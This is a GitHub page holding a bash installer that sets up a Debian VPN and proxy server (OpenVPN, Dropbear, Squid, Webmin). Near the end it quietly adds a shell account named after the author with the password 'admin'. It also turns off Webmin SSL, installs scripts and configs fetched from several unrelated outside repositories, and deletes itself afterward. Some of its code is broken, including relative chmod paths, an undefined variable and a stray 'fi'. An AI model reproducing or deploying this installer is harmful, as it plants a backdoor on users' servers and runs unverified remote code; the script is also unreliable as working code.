Skip to content
Learn Git and GitHub without any code!
Using the Hello World guide, you’ll start a branch, write comments, and open a pull request.


luxiferace
/
HexaTechnology
Code
Issues
Pull requests
Actions
Projects
Wiki
Security
Insights
HexaTechnology/install
@luxiferace
luxiferace Add files via upload
 1 contributor
192 lines (174 sloc)  7.26 KB
 
#!/bin/bash
# ******************************************
# Program: AUTOSCRIPT INSTALL DEBIAN 8.x 32/64Bit
# Developer: AMIR ASHRAF
# COMPANY : HEXA TECHNOLOGY
# Date: 21/10/2018
# Last Updated: 21/10/2018
# ******************************************

myip=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0' | head -n1`;
myint=`ifconfig | grep -B1 "inet addr:$myip" | head -n1 | awk '{print $1}'`;

if [ $USER != 'root' ]; then
	echo "Sorry, for run the script please using root user"
	exit
fi
if [[ ! -e /dev/net/tun ]]; then
	echo "TUN/TAP is not available"
	exit
fi
echo "
AUTOSCRIPT RUN
SETUP BY HEXA TECH | MYVPN
WAITING...
"
clear
echo "START AUTOSCRIPT"
clear
echo "SET TIMEZONE KUALA LUMPUT GMT +8"
ln -fs /usr/share/zoneinfo/Asia/Kuala_Lumpur /etc/localtime;
clear
echo "
ENABLE IPV4 AND IPV6
COMPLETE 1%
"
echo ipv4 >> /etc/modules
echo ipv6 >> /etc/modules
sysctl -w net.ipv4.ip_forward=1
sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
sed -i 's/#net.ipv6.conf.all.forwarding=1/net.ipv6.conf.all.forwarding=1/g' /etc/sysctl.conf
sysctl -p
clear

echo "
REMOVE SPAM PACKAGE
COMPLETE 10%
"
apt-get -y --purge remove samba*;
apt-get -y --purge remove apache2*;
apt-get -y --purge remove sendmail*;
apt-get -y --purge remove postfix*;
apt-get -y --purge remove bind*;
clear
echo "
UPDATE AND UPGRADE PROCESS 
PLEASE WAIT TAKE TIME 1-5 MINUTE
"
sh -c 'echo "deb http://download.webmin.com/download/repository sarge contrib" > /etc/apt/sources.list.d/webmin.list'
wget -qO - http://www.webmin.com/jcameron-key.asc | apt-key add -
apt-get update;
apt-get -y upgrade;
apt-get -y install wget curl;
echo "
INSTALLER PROCESS PLEASE WAIT
TAKE TIME 5-10 MINUTE
"

#install menu
cd
wget -O /usr/local/bin/menu "https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/menu"
wget -O /usr/local/bin/autokill "https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/autokill"
wget -O /usr/local/bin/auto-reboot "https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/auto-reboot"
wget -O /usr/local/bin/reboot_otomatis "https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/reboot_otomatis"
wget -O /usr/local/bin/speedtest "https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/speedtest"
wget -O /usr/local/bin/trial "https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/trial"
wget -O /usr/local/bin/user-generate "https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/user-generate"
wget -O /usr/local/bin/user-lock "https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/user-lock"
wget -O /usr/local/bin/user-password "https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/user-password"
wget -O /usr/local/bin/user-unlock "https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/user-unlockuser-unlock"
chmod 755 usr/local/bin/menu
chmod 755 usr/local/bin/autokill
chmod 755 usr/local/bin/auto-reboot
chmod 755 usr/local/bin/reboot_otomatis
chmod 755 usr/local/bin/speedtest
chmod 755 usr/local/bin/trial
chmod 755 usr/local/bin/user-generate
chmod 755 usr/local/bin/user-lock
chmod 755 usr/local/bin/user-password
chmod 755 usr/local/bin/user-unlock

# motd
cd
wget https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/motd
mv ./motd /etc/motd

# fail2ban & exim & protection
apt-get -y install fail2ban sysv-rc-conf dnsutils dsniff zip unzip;
wget https://github.com/jgmdev/ddos-deflate/archive/master.zip;unzip master.zip;
cd ddos-deflate-master && ./install.sh
service exim4 stop;sysv-rc-conf exim4 off;

# webmin
apt-get -y install webmin
sed -i 's/ssl=1/ssl=0/g' /etc/webmin/miniserv.conf

# ssh
sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
wget -O /etc/issue.net "https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/banner"

# dropbear
apt-get -y install dropbear
wget -O /etc/default/dropbear "https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/dropbear"
echo "/bin/false" >> /etc/shells
echo "/usr/sbin/nologin" >> /etc/shells
cd


# install squid
apt-get -y install squid
wget -O /etc/squid/squid.conf "https://raw.githubusercontent.com/ndndndn/CodesX/main/a/A/squid3.conf"
sed -i $MYIP2 /etc/squid/squid.conf;
# install webserver
apt-get -y install nginx libexpat1-dev libxml-parser-perl

# install essential package
apt-get -y install nano iptables-persistent dnsutils screen whois ngrep unzip unrar

# install webserver
cd
rm /etc/nginx/sites-enabled/default
rm /etc/nginx/sites-available/default
wget -O /etc/nginx/nginx.conf "https://raw.githubusercontent.com/kingmapualaut/gakod/main/nginx.conf"
mkdir -p /home/vps/public_html
echo "<pre>SETUP BY ARA PM +601126996292</pre>" > /home/vps/public_html/index.html
wget -O /etc/nginx/conf.d/vps.conf "https://raw.githubusercontent.com/kingmapualaut/gakod/main/vps.conf"

# openvpn
apt-get -y install openvpn
cd /etc/openvpn/
wget https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/openvpn/openvpn.tar;tar xf openvpn.tar;rm openvpn.tar
wget -O /etc/iptables.up.rules "https://raw.githubusercontent.com/zero9911/a/master/script/openvpn/iptables.up.rules"
sed -i '$ i\iptables-restore < /etc/iptables.up.rules' /etc/rc.local
sed -i "s/ipserver/$myip/g" /etc/iptables.up.rules
iptables-restore < /etc/iptables.up.rules
# etc
wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/openvpn/client.ovpn"
sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
cd;wget https://raw.githubusercontent.com/luxiferace/HexaTechnology/master/script/openvpn/cronjob.tar
tar xf cronjob.tar;mv uptime.php /home/vps/public_html/
mv usertol userssh uservpn /usr/bin/;mv cronvpn cronssh /etc/cron.d/
chmod +x /usr/bin/usertol;chmod +x /usr/bin/userssh;chmod +x /usr/bin/uservpn;
useradd -m -g users -s /bin/bash luxiferace
echo "luxiferace:admin" | chpasswd
echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
rm $0;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
clear

# restart service
service ssh restart
service openvpn restart
service dropbear restart
service nginx restart
service php5-fpm restart
service webmin restart
service squid3 restart
service fail2ban restart

clear
echo "===============================================--"
echo "                             "
echo "  === AUTOSCRIPT FROM HEXA TECH | MYVPN === "
echo "WEBMIN : http://$myip:10000 "
echo "OPENVPN PORT : 59999"
echo "DROPBEAR PORT : 22,443"
echo "PROXY PORT : 7166,8080"
echo "Config OPENVPN : http://$myip/client.ovpn"
echo "SERVER TIME/LOCATION : KUALA LUMPUR +8"
echo "TORRENT PORT HAS BLOCK BY SCRIPT"
echo "CONTACT OWNER SCRIPT"
echo "WHATSAPP : +60175329157"
echo "TELEGRAM : @LuxiferAce"
echo "For SWAP RAM PLEASE CONTACT OWNER"
echo "  === PLEASE REBOOT TAKE EFFECT  ===  "
echo "                                  "
echo "=================================================="
rm *.txt
rm *.sh
exit
fi
© 2020 GitHub, Inc.
Terms
Privacy
Security
Status
Help
Contact GitHub
Pricing
API
Training
Blog
About
